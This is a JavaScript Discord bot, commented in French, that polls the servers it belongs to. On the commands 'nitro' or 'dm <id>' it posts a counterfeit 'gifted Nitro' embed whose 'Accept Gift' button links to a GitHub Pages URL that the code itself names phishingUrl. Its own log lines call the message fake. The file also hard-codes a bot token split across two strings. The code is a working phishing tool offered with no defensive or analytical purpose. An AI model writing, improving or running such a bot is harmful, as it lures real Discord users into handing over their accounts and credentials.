const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;

const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 

async function listen() {
  console.log("Bot en ligne, en attente de commandes (nitro / dm id)...");
  let lastMsgId = null;

  setInterval(async () => {
    try {
      let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
        headers: { "Authorization": `Bot ${botToken}` }
      });
      let guilds = await res.json();
      
      if (!Array.isArray(guilds)) return;

      for (let g of guilds) {
        let chans = await (await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {
          headers: { "Authorization": `Bot ${botToken}` }
        })).json();
        
        if (!Array.isArray(chans)) continue;

        for (let c of chans) {
          if (c.type !== 0) continue; 
          
          let msgs = await (await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {
            headers: { "Authorization": `Bot ${botToken}` }
          })).json();
          
          if (Array.isArray(msgs)) {
            for (let m of msgs) {
              if (!m.content || m.id === lastMsgId) continue;
              
              const content = m.content.toLowerCase().trim();
              
              // Commande "nitro" pour le salon actuel
              if (content === "nitro") {
                lastMsgId = m.id;
                console.log("envoi du faux nitro dans le salon :", c.id);
                sendNitro(c.id);
              }
              
              // Commande "dm ID" pour envoyer en privé
              if (content.startsWith("dm ")) {
                lastMsgId = m.id;
                const targetId = content.split(" ")[1];
                console.log("envoi du faux nitro en dm à :", targetId);
                sendDM(targetId);
              }
            }
          }
        }
      }
    } catch (e) {}
  }, 5000); 
}

async function sendNitro(channelId) {
  let embed = {
    title: "You've been gifted a subscription!",
    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours\n\n[Cliquez ici si le bouton ne marche pas](${phishingUrl})`,
    color: 0x5865f2,
    image: {
      url: "https://i.imgur.com/L8Yt5K0.png"
    },
    footer: {
      text: "Discord Nitro"
    }
  };

  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
    method: "POST",
    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "",
      embeds: [embed],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 5,
              label: "Accept Gift",
              url: phishingUrl
            }
          ]
        }
      ]
    })
  }).catch(() => {});
}

async function sendDM(targetId) {
  let dmRes = await fetch(`https://discord.com/api/v9/users/@me/channels`, {
    method: "POST",
    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
    body: JSON.stringify({ recipient_id: targetId })
  });
  
  let dmData = await dmRes.json();
  
  if (!dmData.id) {
    console.log("erreur création dm :", dmData.message);
    return;
  }
  
  const channelId = dmData.id;
  
  let embed = {
    title: "You've been gifted a subscription!",
    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours\n\n[Cliquez ici si le bouton ne marche pas](${phishingUrl})`,
    color: 0x5865f2,
    image: {
      url: "https://i.imgur.com/L8Yt5K0.png"
    },
    footer: {
      text: "Discord Nitro"
    }
  };

  let msgRes = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
    method: "POST",
    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "",
      embeds: [embed],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 5, 
              label: "Accept Gift",
              url: phishingUrl
            }
          ]
        }
      ]
    })
  });
  
  let msgData = await msgRes.json();
  
  if (msgData.id) {
    console.log("faux nitro envoyé en dm avec succès.");
  } else {
    console.log("erreur envoi message :", msgData.message);
  }
}

listen();
